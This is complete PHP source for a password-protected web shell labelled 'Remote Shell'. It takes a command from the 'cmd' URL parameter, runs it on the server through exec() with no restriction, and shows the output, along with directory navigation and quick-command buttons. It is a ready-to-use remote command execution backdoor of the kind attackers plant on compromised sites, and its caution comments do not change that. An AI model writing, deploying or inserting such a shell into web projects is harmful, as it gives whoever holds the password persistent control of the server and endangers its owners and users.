<?php
// Code compatible with PHP5
error_reporting(0);
session_start();

// WARNING: THIS IS A REMOTE SHELL. DO NOT DEPLOY PUBLICLY WITHOUT EXTREME CAUTION.

// Hashed password setting (MUST BE UPDATED BEFORE USE)
// Use password_hash() to generate your hash, then paste it here.
$hashed_password = "$2y$10$0H.6d4cNxt4.uEtKwg7HZubfQHB14xqdm0Q4Tup0t7ZpkXkS1yRxa"; // <--- ここを書き換えてください

// Password verification and authentication
if (isset($_POST['password'])) {
    // Check if the input password matches the stored hash
    if (password_verify($_POST['password'], $hashed_password)) {
        
        // Check for default hash (Security Check)
        if (password_verify("password", $hashed_password)) {
             echo "ERROR: The password hash is still set to the default placeholder. Please generate and set your own hash immediately.";
             exit;
        }

        $_SESSION['authenticated'] = true;

    } else {
        echo "Incorrect password.";
        exit;
    }
}

// Logout process
if (isset($_GET['m']) && $_GET['m'] === 'logout' ) {
    unset( $_SESSION['authenticated'] );
    session_destroy();
    echo "<body><script>location.href='". $_SERVER['SCRIPT_NAME'] ."';</script></body>";
    exit;
}

// Authentication check
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Display password input form
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Remote Shell</title>  <meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body>';
    echo '<form action="'.htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8').'" method="POST">';
    echo '<input type="password" name="password" placeholder="Password" autofocus>';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    echo '</body></html>';
    exit;
}

// Get the script name
$ownname = "//".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

// Input validation and preparation (Still vulnerable to command execution)
$cwd = isset($_GET['cwd']) ? urldecode($_GET['cwd']) : '';
$cmd = isset($_GET['cmd']) ? urldecode($_GET['cmd']) : '';

header("Content-type: text/html; charset=UTF-8");
echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Remote Shell</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
  function setCommandAndSubmit(command) {
    document.getElementById('cmd').value = command;
    document.forms['f1'].submit();
  }
  function logout(){
    location.href='?m=logout';
  }
  </script>
  <style>
  *{box-sizing:border-box;} 
  body { font-family: Arial, sans-serif; padding: 20px; }    
  pre { background-color: #f0f0f0; padding: 10px; overflow: auto; }
  input[type="text"] { width: 100%; padding: 10px; font-size: 16px; }
  input[type="submit"], .btn { height:3em;padding: 10px 20px; font-size: 16px; background-color: #4caf50; color: #fff; border: none; cursor: pointer; margin:2px 2px 0 0} 
  .btn{ background-color: #af4c50 }
  .logout{
    text-align: right;
  }
  @media only screen and (max-width: 600px) { 
    body { padding: 10px; } 
    pre { font-size: 14px; } 
    input[type="text"] { font-size: 14px; } 
    input[type="submit"], .btn { font-size: 14px; } 
  }
  </style>
</head>
<body>
<div class="logout"><a href="javascript:logout()">Logout</a></div>
  <pre>
HTML;

// Change directory
chdir($cwd);
$wd = getcwd();
echo "CWD: ".$wd."\n";

$cmdpr = htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8');
echo "\n<b>>".$cmdpr."</b>\n";

if (preg_match("/^cd(\s)*/", $cmd)) {
    $cwd = preg_replace("/^cd(\s)*/", '', $cmd);
    if(!chdir($cwd)) {
        $error = error_get_last();
        echo "cd ".$cwd.": Directory name is incorrect.\n";
    }
    $cwd = getcwd();
    echo "CWD: ".$cwd."\n";
} else {
    $output = [];
    exec($cmd." 2>&1", $output);
    foreach($output as $line) {
        echo htmlspecialchars($line, ENT_QUOTES, 'UTF-8')."\n";
    }
}

echo "</pre>";
echo '<form action="'.$ownname.'" method="GET" name="f1">';
echo '<input type="hidden" name="cwd" value="'.htmlspecialchars($cwd, ENT_QUOTES, 'UTF-8').'">';
echo '<input type="text" name="cmd" id="cmd" value="'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'" autofocus>';
echo '<input type="submit" value="Send">';
echo '<input type="button" class="btn" value="Go Home" onclick="location.href=\''. $_SERVER['SCRIPT_NAME'] .'\'">';
echo '<input type="button" class="btn" value="ls -al" onclick="setCommandAndSubmit(\'ls -al\')">';
echo '<input type="button" class="btn" value="cd .." onclick="setCommandAndSubmit(\'cd ..\')">';
echo '<input type="button" class="btn" value="Find Large Files" onclick="setCommandAndSubmit(\'du --max-depth=1 -h | sort -nr | head -n 10\')">';
echo '</form>';
echo '</body></html>';